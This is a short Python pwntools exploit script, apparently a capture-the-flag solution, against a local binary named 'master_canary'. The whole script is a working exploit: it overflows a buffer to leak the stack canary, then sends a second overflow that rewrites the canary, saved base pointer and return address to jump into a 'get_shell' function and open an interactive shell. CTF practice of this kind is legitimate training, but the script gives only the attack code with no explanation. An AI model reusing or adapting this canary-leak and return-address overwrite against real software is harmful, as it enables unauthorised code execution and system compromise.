from pwn import *

exe = ELF('./master_canary')
p = process(exe.path)

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'Size: ', b'2345')
payload = b'a'*2345
p.sendafter(b'Data: ', payload)
p.recvuntil(payload)
canary = int.from_bytes(p.recv(7), 'little') << 8
log.info("Canary: " + hex(canary))


p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'> ', b'3')

payload = b'a'*40 # offset canary va leave_comment
payload += p64(canary)
payload += b'b'*8 # ghi de rbp
payload += p64(exe.sym['get_shell'] + 2)
p.sendafter(b'comment: ', payload)

p.interactive()